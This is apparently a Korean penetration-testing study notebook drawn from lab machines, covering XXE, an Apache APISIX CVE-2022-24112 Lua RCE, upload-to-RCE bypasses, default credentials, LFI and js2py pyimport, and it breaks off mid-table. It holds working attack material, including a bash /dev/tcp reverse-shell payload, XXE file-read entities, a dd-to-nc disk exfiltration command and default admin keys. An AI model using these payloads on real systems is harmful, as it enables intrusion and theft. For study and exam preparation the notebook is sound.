CMS 가 `/users`·`/author/1`·`?author=1`(WordPress)·REST API 등으로 **인증 없이 사용자 목록을 노출**하면, 사용자명을 아는 순간 브루트포스 탐색공간이 두 자릿수로 줄어 **현실적인 공격이 됨.**

[[Monster]] — Monstra `/blog/users` 가 로그인명·이메일을 전체 노출했고 사용자가 **2명**으로 확정돼, 서버 처리량 실측(70 req/s) 기준으로도 사전공격이 시간 안에 가능했음.
→ 뒤집으면 [[Fanatastic]] 의 `grafana_stat_total_users 1`(B-1-29)은 **「브루트가 무의미하다」**를 알려준 것 — 같은 정보가 반대 결론을 냄. **먼저 세고 나서 결정할 것.**

#### B-1-33. XXE (XML External Entity) — DTD·엔티티 배경과 판단 절차

**엔티티(entity)는 XML 매크로임.** 파서가 정의된 이름을 만나면 값으로 치환:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY company "ACME Corp"> ]>
<doc>&company;</doc>
```
`SYSTEM` 키워드를 붙이면 **외부에서 값을 가져옴** — 이것이 **외부 일반 엔티티**이고 이를 악용하는 것이 XXE:
```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```
XML 1.0 명세의 **정상 기능**(문서 간 공용 DTD 참조용)이라 파서 버그가 아님 — 공격자가 XML 문서 전체(DTD 선언부 포함)를 제어할 수 있는 환경에서 살아 있는 것이 문제임.

**진입점은 언제나 「서버가 사용자가 보낸 XML 을 파싱하는 곳」** — SOAP · XML-RPC · SAML 응답 · DOCX/XLSX/SVG 업로드 · XML 설정 임포트 · RSS 취합.

| `SYSTEM` URI | 결과 |
|---|---|
| `file:///etc/passwd` | 로컬 파일 읽기 |
| `http://내서버/x` | **SSRF** — 내부망 스캔·메타데이터 서비스 접근 |
| `php://filter/convert.base64-encode/resource=…` | PHP 한정. 내용을 base64 로 감싸 **파싱 붕괴 회피**(A-2-20) |
| `expect://id` | PHP `expect` 확장이 있으면 RCE(드묾) |

**언어별 «안전하지 않은 기본값»:**
- **Python 2.7 `xml.sax`/`minidom`(expat 백엔드)** — `feature_external_ges` 기본 `True`, 즉 **기본 취약.** ✅ Kali 의 `python2` 로 직접 확인함 — `xml.sax.make_parser().getFeature(feature_external_ges)` 가 `1` 이고 `file:///etc/hostname` 엔티티가 실제로 확장됨. 하드닝은 한 줄:
  ```python
  from xml.sax.handler import feature_external_ges
  parser = make_parser()
  parser.setFeature(feature_external_ges, False)   # 이 한 줄이 XXE 를 죽인다
  ```
  권장 해법은 `defusedxml` 로 교체
- **Java `DocumentBuilderFactory`** — 기본 취약. `setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)` 필요
- **PHP `libxml` < 2.9** — 기본 취약. 2.9 부터 기본 비활성
- **.NET `XmlDocument` 구버전** — `XmlResolver = null` 필요

**「안전하지 않은 기본값」은 「구버전이라 취약」과 다른 결함 클래스임** — 개발자가 실수한 것이 아니라 **아무것도 안 한 것이 취약점이 됨.**
→ **XML 을 받는 엔드포인트를 만나면 일단 XXE 를 시도할 것.** 어느 엔드포인트를 고를지는 A-2-22, 일부 파일만 실패할 때는 A-2-20.

**출처** — [[Muddy]](Ladon SOAP `checkout(uid)`, `xml.sax.make_parser()` 하드닝 부재).

#### B-1-34. Grafana 트래버설 → 설정·DB 탈취 → 복호화 체인에서 막히는 지점

`[가정]` — 이 체인의 막히는 지점은 관측이 아니라 추론이다.

⚠️ **아래는 [[Fanatastic]] 의 실제 시행착오 기록이 «아니라», 같은 유형을 다룰 때 반복적으로 발생하는 실패 지점을 정리한 것임** `[가정]`.

- **(a) CFB 세그먼트 크기 불일치** — 증상이 「키가 거의 맞는 것처럼」 보여 키를 의심하게 만드는 것이 고약함. **평문 앞 1~2바이트만 말이 되면 키가 아니라 모드 파라미터를 의심할 것.** 상세와 실측 검증은 B-68
- **(b) `secure_json_data` 가 JSON «안»에 들어 있음** — DB 컬럼 값이 `{"basicAuthPassword":"..."}` 형태임. JSON 을 파싱하지 않고 컬럼 전체를 base64 디코딩하려 하면 당연히 실패 — **값 부분만 꺼낼 것**
- **(c) Grafana 9 이상은 포맷이 다름** — 9.x 부터 엔벨로프 암호화가 기본이 되어 `secret_key` → 데이터 키 → 데이터의 **2단 구조**가 되고 암호문 앞에 `#` 로 감싼 키 이름이 붙음. **버전을 먼저 확인하고 포맷을 고를 것** — 8.x 스크립트를 9.x 에 돌리면 **조용히 쓰레기가 나옴**
- **(d) 플러그인 ID 추측 실패** — `alertlist` 가 통하지 않는 버전·설치본이 있음. 404 를 받고 「패치됨」으로 결론짓기 쉬움 → `/metrics` 의 `grafana_plugin_build_info`, 또는 로그인 페이지가 로드하는 JS 에서 **실제 플러그인 경로를 관찰**할 것(B-1-29)
- **(e) `debugfs` 가 타겟에 없음** — e2fsprogs 가 최소 설치에서 빠져 있을 수 있음 → 대안은 `dd if=/dev/sda2 bs=1M | nc` 로 Kali 에 넘겨 로컬에서 처리하거나, `grep -a` 로 디바이스에서 직접 키 문자열 검색(B-3-10)

#### B-1-35. Apache APISIX — batch-requests 로 Admin API 우회 → 라우트 `filter_func` Lua RCE (CVE-2022-24112)

**보이면** — `Server: APISIX/<버전>` 응답 헤더. 비표준 고포트에 자주 뜸([[Flimsy]] 는 tcp/43500, `nmap-services` 미등재라 `-p-` 필수, A-1-15).

**영향 범위** — 1.3 ~ 2.12.0, 2.10.x LTS 는 2.10.4 미만.

**순서**
1. `/apisix/admin/routes` 직접 호출 → openresty **403** = IP 허용목록 존재 = **전제조건 충족**(B-15)
2. `POST /apisix/batch-requests` — 본문 `headers` 에 `X-Real-IP: 127.0.0.1` + `X-API-KEY: edd1c9f034335f136f87ad84b625c8f1`(기본값), `pipeline` 에 하위 요청. 읽기(GET)로 먼저 검증
3. 같은 경로로 `PUT /apisix/admin/routes/<id>` — `filter_func` 에 Lua 를 실음
4. `GET /<uri>` 로 라우트 매칭 발화

**왜 `filter_func` 인가** — 라우트 스키마 중 이 필드만 **Lua 함수 소스를 문자열로 받아 라우트 매칭 시점에 평가**함. 업스트림에 프록시하기 **전** 단계라 `upstream` 이 안 열려도 상관없음(스키마 필수 필드라 넣기만 함). **설정 필드가 코드를 받으면 그것이 RCE 임** — 파일 업로드도 템플릿도 아닌 「라우팅 규칙」이 실행 경로가 되는 형태를 기억할 것.

```lua
function(vars) os.execute('bash -c "0<&160-;exec 160<>/dev/tcp/<LHOST>/<LPORT>;sh <&160 >&160 2>&160"'); return true end
```
- **`bash -c` 로 감쌀 것.** `os.execute` 는 `/bin/sh` 를 부르고 우분투에서 그것은 dash 임. dash 는 `/dev/tcp` 에 **도달조차 못 함** — 앞의 `0<&160-` 에서 파싱이 먼저 깨져 `dash: 1: Syntax error: Bad fd number` 임(`No such file or directory` 가 **아님** — 에러 문구만 보고 「경로 문제」로 오독하기 쉬움). Kali 에서 확인. 같은 dash 함정의 일반형은 A-31
- **JSON 안에 JSON 문자열, 그 안에 따옴표 든 Lua** — 삼중 인용이라 손으로 쓰면 반드시 틀림. `json.dumps` 에 맡길 것(B-81)
- **트리거 응답의 타임아웃은 «성공의 정상 형태»임.** 셸이 fd 를 물고 있어 응답이 끝나지 않음(A-12)
- **기존 라우트를 먼저 덤프하고 나서 쓸 것.** [[Flimsy]] 에는 이전 작업자의 라우트가 굳어 있었음(`id=index`, `uri=/rms/fzxewh`, `filter_func` 안에 `192.168.118.3:80` 리버스셸, `create_time` 1658799753 = 2022-07-26). 교훈 둘 — ⓐ **남의 백도어를 재사용하려 들지 말 것**(LHOST 가 내 것이 아님) ⓑ **기존 상태를 먼저 덤프해야 정리 단계에서 「원래 뭐가 있었는지」를 알 수 있음.** 덮어쓰지 말고 별도 `id` 로 분리할 것(C-5)
- **자동 도구 없이 전 과정이 수동임** — `curl` 한 줄로 batch-requests 를 때려보는 것이 전부이고, python 스크립트를 쓴 이유는 자동화가 아니라 삼중 인용 때문임. 그대로 시험장에서 쓸 수 있음(E 절)

**전이되는 것은 APISIX 가 아니라 조합 셋임** — ① **비표준 고포트에 뜬 관리용 API** ② **기본 관리 토큰이 설정파일에 하드코딩** ③ **「내부에서만 접근 가능」을 헤더로 판정하는 인가.** 조합만 바꿔 계속 나옴. 특히 ③ — `X-Real-IP`·`X-Forwarded-For` 로 내부 판정을 하는 서비스를 만나면 반사적으로 위조해 볼 것.

**출처** — [[Flimsy]].

#### B-1-36. 인증 후 파일 업로드 → RCE — 조건 셋과 업로드 경로 찾기

**관리자 세션을 얻으면 관리자 기능 «자체»가 익스플로잇임.** 포럼·CMS 관리 패널에는 거의 항상 다음 중 하나가 있음:

| 기능 | RCE 로 가는 경로 |
|---|---|
| 첨부·미디어 업로드 | 확장자 필터를 뚫고 `.php` 업로드 |
| **로고·아이콘·아바타 업로드** | 첨부와 «다른 코드 경로»라 화이트리스트가 안 걸리는 경우가 있음([[Codo]]) |
| 테마·템플릿 편집기 | 템플릿에 PHP 코드 삽입 후 페이지 렌더 |
| 플러그인 업로드 | `.zip` 안에 웹셸 |
| 백업·복원 | 임의 경로에 파일 쓰기 |
| 로그 뷰어 + LFI | 로그에 PHP 주입 후 포함 |

⚠️ **「첨부 확장자 화이트리스트가 있으니 업로드는 막혔다」로 접지 말 것.** [[Codo]] 의 Global Settings 화면은 첨부 확장자 화이트리스트(`jpg,jpeg,png,gif,pjpeg,bmp,txt`)를 다루면서도 **같은 화면의 「포럼 로고」 필드는 `.php` 를 그대로 받아** `sites/default/assets/img/attachments/` 에 저장했음(CVE-2022-31854). 실측으로 확인된 것은 「`.php` 가 저장되고 실행됐다」까지고 **화이트리스트가 로고 경로에 왜 미적용인지는 소스 미확인** `[가정]`.
→ **업로드 필드를 «기능별로» 세어볼 것.** 첨부 · 로고 · 파비콘 · 아바타 · 배경 · 임포트/복원 — 각각 다른 핸들러일 수 있음(A-2-22).

**왜 업로드가 곧 RCE 인가 — 조건 셋이 동시에 성립해야 함:**
1. `.php` 확장자가 저장됨 — 필터가 없거나, 우회 가능하거나, 서버가 이중 확장자를 PHP 로 넘김
2. 저장 위치가 웹루트 아래임 — URL 로 도달 가능해야 함
3. 그 디렉터리에서 PHP 실행이 안 막혀 있음 — `.htaccess` 의 `php_admin_flag engine off` 나 `<FilesMatch>` 차단이 없어야 함

**응답 코드로 어디가 막혔는지 즉시 가름** — **404** = 그 URL 에 파일이 없음(경로·파일명 문제, 2번) / **200 인데 소스가 그대로 보임** = PHP 로 실행이 안 됨(3번 또는 1번) / **403** = 디렉터리 접근 차단.

**업로드가 막혔을 때의 우회 사다리 — 위에서부터:**
1. 그냥 `.php` — 놀랍도록 자주 통함. 먼저 시도할 것
2. 대체 확장자 — `.php3` `.php4` `.php5` `.php7` `.phtml` `.phar` `.inc` (⚠️ Debian 계열 현행 `.conf` 정규식에서는 `.php3~7` 이 **실행되지 않음.** 서버 설정이 넓게 잡혀 있을 때만 통함 — **통한다고 단정하지 말 것**)
3. 대소문자 — `.PHP` `.pHp`(블랙리스트가 소문자만 볼 때)
4. 이중 확장자 — `shell.php.jpg` / `shell.jpg.php`
5. 널바이트 — `shell.php%00.jpg`(PHP 5.3 미만)
6. Content-Type 위조 — `image/jpeg` 로 바꿔 MIME 검사만 통과
7. 매직바이트 + PHP — 앞에 `GIF89a;` 를 붙이고 뒤에 `<?php … ?>`(`getimagesize()` 우회)
8. `.htaccess` 업로드 — `AddType application/x-httpd-php .jpg`

⚠️ 「검증하는 파서 ≠ 처리하는 파서」로 넘는 계열은 B-1-20, 업로드 기능 자체가 죽어 있는지의 계층 분리는 A-2-26.

**업로드 경로 찾기 — 여기서 가장 자주 막힘.** 올리는 데 성공해도 URL 을 모르면 실행 못 함.

① 응답이 알려주는 경우(가장 흔함 — 여기부터)
```bash
curl -s http://<타겟>/<업로드된_글> | grep -oE '(src|href)="[^"]*attachments[^"]*"'
```
업로드 성공 화면의 미리보기 URL · 글에 삽입된 첨부 링크의 `href` · 관리자 패널의 파일 매니저 목록 · JSON 응답의 `url` 필드 · HTTP `Location:` 헤더.

② 응답이 안 알려주는 경우 — **공개 PoC 에 경로가 하드코딩돼 있음**(A-14). [[Codo]] 는 EDB 50978 의 `payloadURL = options.target + '/sites/default/assets/img/attachments/'` 한 줄이 답이었음.
```bash
searchsploit -m <exploit-id>
git clone <제품 저장소> && grep -rn "upload_dir\|move_uploaded_file\|attachments" .
for d in uploads upload files media attachments images img \
         sites/default/assets/img/attachments assets/uploads wp-content/uploads; do
  printf '%-45s %s\n' "$d" "$(curl -s -o /dev/null -w '%{http_code}' http://<타겟>/$d/)"
done
curl -s http://<타겟>/sites/default/assets/img/attachments/   # 디렉터리 인덱싱
```

| 제품군 | 업로드 관례 경로 |
|---|---|
| CodoForum | `sites/default/assets/img/attachments/` |
| WordPress | `wp-content/uploads/YYYY/MM/` |
| Joomla | `images/` · `tmp/` |
| Drupal | `sites/default/files/` |
| phpBB | `files/` · `images/avatars/upload/` |
| Laravel | `storage/app/public/` · `public/uploads/` |
| Tomcat | `webapps/<앱>/`(WAR 배포) |

⚠️ **파일명이 서버에서 바뀌면 `payload.php` 로 두드려도 404 임.** 해시·타임스탬프·랜덤으로 재생성하는 CMS 가 많음. **404 를 「업로드 실패」로 오독하면 여기서 30분을 잃음.** 대응 — ①로 되돌아가 응답 본문·DOM 에서 실제 파일명 찾기 · 디렉터리 인덱싱 · 관리자 패널의 첨부 관리 화면 · 그래도 안 되면 경로를 통제할 수 있는 기능(테마 편집기·백업 복원)으로 갈아탈 것. 타임스탬프 기반이면 브루트가 됨(B-1-31).
[[Codo]] 는 파일명이 유지된 쉬운 케이스였음(수동 업로드라 `payload.php` 그대로). **시험에서는 그렇지 않을 것으로 가정할 것.**
⚠️ 어느 웹루트에 심을지는 별도 문제임 — 웹서버가 root 로 돌면 그 자리가 곧 root 셸임(A-2-14 · B-34).

**⛔ 우회 사다리를 고르기 전에 「서버가 «무엇을» PHP 로 넘기는가」부터 확인할 것 — 확장자와 실행의 연결은 앱이 아니라 웹서버가 만듦.** 앱의 업로드 필터가 `.php` 를 막아도 서버가 다른 확장자를 PHP 로 실행하면 필터는 무의미함. Ubuntu·Debian PHP 패키지의 기본 설정(`/etc/apache2/mods-enabled/php*.conf`):
```apache
<FilesMatch ".+\.ph(ar|p|tml)$">
    SetHandler application/x-httpd-php
</FilesMatch>
```
`.phar`·`.php`·`.phtml` **셋만** 실행됨. `.phar` 가 들어간 이유는 PHP 아카이브를 웹에서 직접 실행할 수 있게 하기 위해서고, 그 결과로 **`.php` 만 막는 블랙리스트가 통째로 무력화됨.** 이 정규식에서 `.php3`~`.php7`·`.pht` 는 매칭 안 됨 — 그건 구형 `AddType application/x-httpd-php .php .php3 .phtml` 나열식 설정이 남은 서버에서만 통함(위 사다리 2번의 경고와 같은 근거).

**셸 없이도 확인 가능함** — `<?php echo 7*6; ?>` 를 각 확장자로 올려 응답이 `42` 면 실행, 원문 그대로면 정적 서빙임.
→ **물어야 할 질문은 「이 확장자가 위험한가」가 아니라 「서버가 이 확장자를 어느 handler 로 넘기는가」임.** 정답은 앱 코드가 아니라 **웹서버 설정 파일**에 있음. 블랙리스트가 구조적으로 지는 이유가 이것 — 화이트리스트는 허용할 것만 세면 되고 그 집합은 유한한데, 블랙리스트는 **서버 설정에 따라 변하는 집합**을 세야 함.

[[Exfiltrated]](CVE-2018-19422, Subrion CMS 4.2.1) — 업로드 API 응답이 `mime: text/x-php` 를 **그대로 찍었는데도 통과**했음. **서버가 내용을 실제로 들여다봤지만(확장자로는 안 나오는 판정) 차단 경로에 연결하지 않았다는 증거**임 — 검사 결과가 로깅용으로만 존재하는 방어 착시(B-1-20 의 짝).

**같은 계열** — [[Exfiltrated]](`.phar`) · [[Squid]](파일 쓰기 경로 자체를 바꾸는 계열) · [[Crane]] · [[Levram]].

**출처** — [[Codo]](CodoForum v5.1, CVE-2022-31854) · [[Exfiltrated]](Subrion CMS 4.2.1, CVE-2018-19422).

⚠️ **IIS/ASP.NET 에서는 `/App_Data/` 를 피할 것** — IIS 가 그 디렉터리의 실행을 거부하므로 웹셸이 떨어져도 안 돎. 관례 경로 프로빙 목록에는 넣되 **투하 대상에서는 뺄 것.**
⚠️ **다만 이 함정을 「항상 일어나는 것」으로 적지 말 것.** [[Butch]] 에서는 **발생하지 않았음** — 업로드본이 웹루트에 그대로 떨어져 `:450/webshell.ashx` 로 즉시 접근됐음(스크린샷 `Pasted image 20260818111513.png` 의 URL 이 근거). **업로드 대상 디렉터리에 리스팅이 켜져 있으면 열어보는 것으로 끝남.**


**테마·템플릿 편집기는 「취약점」이 아니라 «설계된» 코드 실행임 — 그래서 업그레이드로 안 막힘.**
[[plum]](PluXml 5.8.7, CVE-2024-48138) 실측 — `core/admin/parametres_edittpl.php` 의 저장 로직이 **v5.8.7(2021) · v5.8.16 · v5.8.23(2026) 이 사실상 동일**함(세 태그 diff 는 `include` 경로 표기 3곳뿐). 벤더도 발견자도 「관리자는 PHP 템플릿을 편집할 수 있다」를 정상 기능으로 봄(*"can always execute arbitrary code"*). master 가 `$tpl` 화이트리스트를 넣어 임의 파일명은 막았으나 **화이트리스트에 `.php` 가 남아 있어 「관리자 = 코드 실행」은 그대로**임.
→ **관리자 세션을 얻었으면 CVE 를 찾지 말고 관리자 기능 목록부터 셀 것.** 테마·템플릿 편집기 · 플러그인 업로드 · 백업/복원 · 파일 관리자 · 크론/작업 스케줄러 — 하나라도 있으면 이미 RCE 임.
**`eval()` 이 필요 없음** — 테마 템플릿은 데이터가 아니라 `include` 되는 PHP 소스라 **파일 내용이 곧 코드**임.
**DB 가 없는 CMS 는 공격면이 「파일 시스템」으로 옮겨간 것뿐임.** PluXml 은 XML 파일 저장이라 SQLi 면이 아예 없고, 대신 웹서버 계정이 웹 루트에 쓰기 권한을 가져야 앱이 돎 — **「임의 파일 쓰기」가 정상 기능**이고 그것이 그대로 공격면임. 저장 방식별로: RDBMS → SQLi `INTO OUTFILE`/`DUMPFILE` · 역직렬화 저장 → insecure deserialization · 플랫파일/XML → 파일 쓰기 권한 · XXE · 트래버설.
**앱의 진단 페이지가 공격 전제조건을 대신 확인해줌** — PluXml 의 Information 화면이 `themes/ has write access` 를 **초록 체크**로 알려줬음. 찾을 이름: `Information` · `System Status` · `Site Health`(WordPress) · `phpinfo.php` · `info.php` · `server-status` · `/actuator/env`. **디렉터리 브루트 30분보다 이 페이지 30초가 나음**([[Squid]] 의 `phpsysinfo`·`testmysql.php` 가 같은 역할).

#### B-1-37. 로그인 폼을 만나면 기본 자격증명이 1순위 — 제품별 기본값 표

**브루트포스보다 기대값이 압도적으로 높음.**

| | 기본 자격증명 | 브루트포스 |
|---|---|---|
| 요청 수 | 5~10회 | 수천~수십만 회 |
| 소요 시간 | 1분 | 수십 분~시간 |
| 계정 잠금 위험 | 거의 없음 | 높음. 잠기면 그 박스는 끝(A-2-12) |
| 탐지 | 로그 몇 줄 | IDS/WAF 확정 탐지(C-5) |
| 시험 규정 | 제한 없음 | 제한적 허용이나 사실상 시간만 태움 |

**순서는 고정임:**
1. 제품별 문서상 기본값(제품을 식별했으면 1순위)
2. `admin:admin` · `admin:password` · `admin:123456` · `administrator:administrator`
3. 정찰에서 주운 것 — 페이지 하단 이메일, 팀 소개, `robots.txt`, 커밋 로그의 이름
4. 그래도 없으면 그때 짧은 사전으로 스프레이

**후보가 유한하므로 배치로 쏘고 응답을 diff 할 것**(D 절). 판정은 상태코드가 아니라 **본문 크기 diff** 로도 충분함.

| 제품 | 기본 자격증명 | 관리 경로 |
|---|---|---|
| CodoForum | 설치 시 관리자 지정 — `admin:admin` 은 「게으른 설치」의 산물([[Codo]]) | `/admin/index.php` |
| H2 Database Console | `sa` + **빈 비밀번호**([[Jacko]], B-2-14) | `:8082` |
| Tomcat Manager | `tomcat:tomcat` · `admin:admin` · `tomcat:s3cret` | `/manager/html` |
| Jenkins | 초기 비인증 또는 `admin:admin` | `/` · `/script` |
| phpMyAdmin | `root:`(빈 비밀번호) | `/phpmyadmin` |
| Grafana | `admin:admin` | `/login` |
| Zabbix | `Admin:zabbix` | `/zabbix` |
| JBoss·WildFly | `admin:admin` | `/console` |
| Webmin | 설치 시 root 계정 | `:10000` |
| PRTG | `prtgadmin:prtgadmin` | `/index.htm` |
| GitLab | `root:5iveL!fe`(구버전) | `/users/sign_in` |

⚠️ **표의 값은 「해봐야 아는 후보」지 확정된 현행 기본값이 아님.** 제품·버전에 따라 다름 — 표에 없는 제품은 `searchsploit <제품명> | grep -i default` 와 「제품명 + default password」 검색이 익스플로잇 검색보다 회수율이 높음.
⚠️ **API 토큰·관리 키에도 기본값이 있음** — 웹 폼만 보지 말 것(B-15 · [[Flimsy]] APISIX `edd1c9f0…`).

**기본 자격증명은 「취약점이 아니다」가 아님** — OWASP A05/A07, CWE-1392(Use of Default Credentials). CVE 번호가 없다고 등급이 낮은 것이 아니라 실제 침해 사고의 최상위 원인임.

⚠️ **HTTP 200 이 실패를 뜻할 수 있음.** 로그인 실패 시 폼을 다시 렌더하면 200 이고 성공 시 대시보드로 보내면 302 임 — 이 계열 앱에서는 **302 가 성공**임. 판정은 셋을 함께 볼 것: ①상태 코드 ②`Location:` 헤더 ③`Set-Cookie` 로 세션이 새로 발급됐는가(A-12).

**이 뒤에 오는 것이 「특정 버전의 인증 후 RCE」임**(A-13). [[Codo]] · [[Crane]] · [[Levram]] · [[Exfiltrated]] · [[Hawat]] · [[CVE-2023-46818]] 이 전부 같은 형태이고, 업로드 경로로 이어지면 B-1-36.

**⛔ 기본값 10개가 전부 실패했을 때의 다음 후보를 «미리» 정해둘 것 — 시험장에서 즉석 고민은 늦음.** 브루트포스로 넘어가는 것이 아님(D 절 [[Codo]] 표).
1. **사용자명 열거** — `/members/`·`/users`·`?author=1`·REST API 로 계정 목록 확보(B-1-32). 목록이 확정되면 탐색공간이 두 자릿수로 줄어 **소수 후보 스프레이**가 성립함
2. **스프레이는 계정당 횟수를 세고 들어갈 것** — 잠금 임계값(보통 5~10) 아래로. 후보는 사이트 콘텐츠에서 만듦(B-6-10 · B-55)
3. **비밀번호 재설정 로직 결함** — `/forgot/` 의 토큰 생성·검증
4. **설치·업데이트 마법사 재실행 가능 여부** — `/install/`·`/updates/`. 재실행되면 관리자 계정을 새로 만들 수 있음
5. 그래도 없으면 **로그인 폼을 접고 비인증 표면으로 복귀**(A-25 — 폼 자체가 미끼인 경우가 있음)

— [[Exfiltrated]] 의 분기 계획에서 옮긴 것. 이 박스는 1단계 전에 `admin:admin` 이 통해 실제로 쓰이지는 않았음 `[가정]`.

**SuiteCRM · SugarCRM — `admin:admin`.** [[Crane]] 에서 성립. 로그인 폼에 `csrf_token` 이 없어 curl 한 방으로 검증됨.
```bash
curl -sS -i -X POST 'http://<타겟>/index.php' \
    -d 'module=Users&action=Authenticate&user_name=admin&username_password=admin&Login=Log+In'
```
`302` + `Location: index.php?module=Home&action=index` = 성공. 실패 시에는 `Location: index.php?module=Users&action=Login&loginErrorMessage=…` 로 되돌림.

| 플래그 | 역할 | 빼면 |
|---|---|---|
| `-i` | 응답 헤더 출력 | 성공·실패가 `Location:` 헤더로 갈려 **판정 자체가 불가능** |
| `-sS` | 진행률만 끄고 에러는 표시 | `-s` 만 쓰면 연결 실패도 조용히 지나감 |
| `-L` 미사용 | 리다이렉트를 따라가지 않음 | 붙이면 302 를 따라가 최종 200 만 보임 — **판정 신호 소멸** |

⚠️ **post-auth CVE 를 만나면 CVE 보다 기본 자격증명이 먼저임.** [[Crane]] 의 실제 정답 순서도 ① 기본 자격증명 시도 → ② CVE 발사였음. 순서를 거꾸로 하면 「CVE 가 안 먹는다」고 오판함 — **30초면 됨.**
→ **같은 골격의 변형으로 예상할 것** — Laravel `Ignition` · Drupal · Magento · Zabbix · Cacti · phpMyAdmin. 제품만 바뀌고 「기본 자격증명 → 그 버전의 인증 후 RCE」 구조는 그대로임(B-1-44).


표에 1행 추가 — `| PluXml | admin / admin | /core/admin/ | [[plum]] 실측 |`
그리고 순서 규율 한 줄: **기본 자격증명 → 다른 서비스에서 주운 자격증명 재사용 → 브루트포스.** 기본값 3~5개는 **1분**이면 끝나고 통하면 몇 시간을 아낌. `hydra`·`wfuzz` 는 시험에서 쓸 수 있지만 시간을 잡아먹으므로 뒤임.

#### B-1-38. LFI 진입점이 한 앱에 «두 개» 있을 수 있다 — 하나는 소스 전용, 하나는 실행 가능

**증상** — `?page=` 류 파라미터로 LFI 를 확인했는데 확장자가 강제로 붙어(`include($_GET['page'].".php")`) 소스 읽기 이상으로 못 감. 「LFI 는 찾았는데 실행이 안 된다」로 접으면 놓침.

[[PwnLab]] — 그 **첫 번째 LFI 로 뽑아낸 `index.php` 소스 «안»에** 두 번째 include 가 있었음:
```php
if (isset($_COOKIE['lang']))
{
	include("lang/".$_COOKIE['lang']);
}
// Not implemented yet.
```
주석이 `Not implemented yet` 이라 죽은 코드처럼 보이지만 **실제로 실행됨.** 그리고 **확장자 강제가 없어** 업로드한 임의 파일을 그대로 include 시킬 수 있었음 — 업로드 필터를 GIF 폴리글롯으로 넘긴 것(B-1-20)이 여기서 실행으로 이어짐.

→ **`php://filter` 로 소스를 확보했으면 그 소스의 «모든» `include`/`require` 호출부를 훑을 것.** 첫 번째로 찾은 싱크가 하드닝돼 있다고 애플리케이션 전체가 안전한 것이 아님 — **같은 파일에 두 번째 싱크가 나란히 있는 경우가 실재함.**
```bash
grep -nE "include(_once)?|require(_once)?" *.php
```
→ 변형 예상 — include 진입점이 쿠키가 아니라 `Accept-Language` 헤더나 세션 파일(`/var/lib/php*/sessions/sess_*`)인 경우. **파라미터만 보지 말고 헤더·쿠키·세션도 입력으로 셀 것**(A-2-19).

**출처** — [[PwnLab]].

#### B-1-39. 인터프리터에 사용자 문자열이 들어가면 RCE 다 — js2py `pyimport`(CVE-2023-0297)

**샌드박스 안에서 돌린다는 것은 방어가 아님.** 물을 것은 「인젝션이 되느냐」가 아니라 **「샌드박스가 무엇이고 어디로 새느냐」**임.

**설계상 코드를 실행하는 엔드포인트는 늘 1급 표적임** — 템플릿 렌더러, 수식 계산기, 규칙 엔진, 리포트 필터, 프로토콜 어댑터. **입력을 데이터가 아니라 프로그램으로 취급하는 지점**은 전부 같은 유형임.

**js2py 는 JS 를 파이썬으로 «번역해» 실행하고, 자체 확장 키워드 `pyimport` 로 파이썬 모듈을 JS 스코프에 그대로 노출함:**
```javascript
pyimport os          // ← 자바스크립트에 이런 문법은 없다. js2py가 추가한 것이다
os.system("id")      // 임포트된 파이썬 모듈이 JS 스코프의 객체가 된다
```
흔히 「샌드박스를 우회했다」고 설명하나 **틀림.** `pyimport` 는 js2py 가 **의도적으로 제공하는 상호운용 기능**이고 탈출할 담장이 애초에 없었음. 그래서 난독화도, 프로토타입 체인 트릭도, `__class__.__mro__` 도 필요 없음.
- 트랜스파일 단계에서 `pyimport os` → `import os as PyImport_os` 로 «문자 그대로» 바뀜(`js2py/translators/translating_nodes.py` 의 `PyimportStatement()`)
- 파서 기본값은 `ENABLE_PYIMPORT = False` 이나 `import js2py` 하는 순간 `pyjsparser.parser.ENABLE_PYIMPORT = True` 로 켜짐. **명시적으로 끄지 않는 한 켜져 있는 것이 기본임**

**같은 계열의 착각** — Jinja2 `{{ ''.__class__ }}`(B-11) · Node `vm` 의 `this.constructor.constructor` · Groovy 샌드박스. **변형은 제품만 바뀜** — pyLoad 대신 Jenkins 스크립트 콘솔, js2py 대신 Jinja2·Twig SSTI, `pyimport` 대신 `__class__.__mro__`. **인터프리터에 도달했다면 이미 RCE 임.**

**⚠️ 라이브러리 이력의 «왕복»을 볼 것 — 한 번 걷어냈던 의존성이 되돌아오면 그 사이의 판단이 함께 돌아오지 않음.**

| 시점 | 사건 | 커밋(실측) |
|---|---|---|
| 2015-03 | js2py 에 `pyimport` 기능 추가 | — |
| 2016-11-15 | js2py 에 `disable_pyimport()` 차단 API 추가 | `Js2Py` `718a7d1` *"Python 2.6, experimental ECMA 6 support and more!"* |
| 2018-08-09 | pyLoad 가 js2py 최초 도입 | `pyload` `79a9cac1` *"[JsEngine] Add support for Js2Py and nodejs"* |
| 2019-06-05 | pyLoad 가 js2py 를 제거(requests_html 로 교체) | `pyload` `ec90b12c` *"Replace js2py with requests_html"* |
| 2020-08-20 | pyLoad 가 js2py **재도입** — `disable_pyimport()` 를 호출하지 않음 | `pyload` `28572b3d` |
| 2023-01-03 | CVE-2023-0297 패치 = `disable_pyimport()` 한 줄 추가 | `pyload` `7d73ba79` |

재도입(2020-08-20)부터 패치(2023-01-03)까지 **약 2년 4개월간 무방비**였음. 차단 수단은 그보다 **6년 2개월 앞선** 2016-11-15부터 존재했음. 왕복은 `git log` 한 줄로 보임:
```bash
git log --oneline --reverse -S"js2py" --date=short --format="%h %ad %s"
```

**⚠️ 문서가 위험을 말해주기를 기다리지 말 것.** js2py README 는 `pyimport` 를 순수 기능으로만 소개하고 `untrusted`·`security`·`sandbox`·`malicious` 가 **한 번도 나오지 않음.** 라이브러리를 신뢰 경계에 놓을 때는 **호스트 언어로 나가는 통로를 제공하는지 직접 확인할 것**(B-18).

**시험 관점** — pyLoad 자체는 안 나오겠지만 **템플릿·스크립트 엔진에 사용자 문자열이 들어가는 유형은 SSTI 로 반드시 나옴.** 「버전 확인 → CVE → 공개 익스플로잇」 단순 체인은 OSCP foothold 의 상당수이고, 관건은 CVE 를 아는 것이 아니라 **버전을 정확히 못 박는 것**임(A-13).

**출처** — [[pyLoader]].

#### B-1-40. 관리 화면이 렌더한 «경로»가 실행 계정을 말해준다 — 권한상승 유무를 익스플로잇 전에 안다

**웹앱 관리·정보 화면에서 경로가 노출되면 반드시 읽을 것.** `/root/` 인지 `/home/<user>/` 인지 `/var/www` 인지 `C:\Users\<user>\` 인지가 **실행 계정을 말해줌.**

| 노출된 경로 | 실행 계정 | 함의 |
